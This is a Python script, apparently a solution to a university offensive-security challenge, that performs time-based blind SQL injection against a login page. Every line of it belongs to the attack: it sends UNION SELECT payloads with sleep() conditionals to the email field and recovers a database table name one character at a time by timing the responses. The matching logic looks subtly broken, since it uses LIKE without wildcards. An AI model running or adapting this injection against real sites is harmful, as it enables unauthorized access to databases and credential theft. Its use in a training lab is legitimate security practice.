import requests
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
username = 'admin'
dbname_len = 12
sqlSleepTime = 5
requestTimeOut = 4

def main():
    target = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php'
    headers = {
        'Accept':'application/x-www-form-urlencoded'
    }
    foundChars = ''
    for i in range(dbname_len):
        if(foundChars is None and i > 0):
            break
        for c in chars:
            try:
                teststr = foundChars + c
                data = f"email={username}'1 and 1=2 UNION SELECT table_schema, table_name, 1 FROM information_schema.tables WHERE 1=1 AND IF(table_name like '{teststr}',sleep({sqlSleepTime}),true) ORDER BY table_name DESC --&password="
                cookies = {
                    'CHALBROKER_USER_ID':'hlb325'
                }
                proxies = { 'http':'127.0.0.1:8080',
                            'https':'127.0.0.1:8080' }
                r = requests.post(target, headers=headers, cookies=cookies, data=data, timeout=requestTimeOut, verify=False)#, proxies=proxies)
            except requests.exceptions.Timeout:
                foundChars += c
                
                break
    print('we found '+ foundChars)

main()
